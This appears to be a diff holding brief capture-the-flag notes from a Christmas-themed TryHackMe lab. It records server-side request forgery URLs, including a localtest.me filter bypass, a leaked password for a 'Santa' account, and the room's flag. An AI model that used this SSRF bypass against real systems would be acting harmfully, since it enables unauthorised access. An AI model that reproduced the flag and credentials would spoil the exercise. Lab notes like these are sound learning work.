@@ -1,0 +1,54 @@
+http://10.10.125.121/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dlol
+
+
+lol is on the nice list
+
+
+
+
+http://10.10.125.121/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F 
+
+
+
+
+
+
+http://10.10.125.121/?proxy=http%3A%2F%2Flist.hohoho.localtest.me
+
+
+
+
+
+Santa,
+
+If you need to make any changes to the Naughty or Nice list, you need to login.
+
+I know you have trouble remembering your password so here it is: Be good for goodness sake!
+
+- Elf McSkidy 
+
+
+
+
+
+'''
+be good for goodness sake
+
+Be good for goodness sake!
+'''
+
+
+user:Santa
+pass:Be good for goodness sake!
+
+
+
+
+onclick="alert('THM{EVERYONE_GETS_PRESENTS}')" value="DELETE NAUGHTY LIST"/>
+</body>
+
+
+THM{EVERYONE_GETS_PRESENTS}
+
+
+
